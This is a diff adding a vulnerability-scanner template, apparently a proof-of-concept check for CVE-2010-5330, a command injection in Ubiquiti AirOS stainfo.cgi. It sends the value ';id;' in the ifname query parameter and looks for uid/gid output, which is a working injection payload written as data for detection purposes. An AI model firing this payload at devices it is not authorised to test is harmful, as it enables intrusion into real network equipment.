@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "验证 Ubiquiti AirOS stainfo.cgi 的 ifname 参数命令注入漏洞（CVE-2010-5330），通过注入 shell 元字符执行 id 命令验证漏洞存在"
+id = "POC-AVE-2010-0555"
+name = "Ubiquiti AirOS stainfo.cgi 命令注入 PoC"
+severity = "high"
+tags = ["ave-2010-0555"]
+vuln_id = [
+    "CVE-2010-5330",
+    "AVE-2010-0555",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/stainfo.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[poc.requests.query]
+ifname = ";id;"
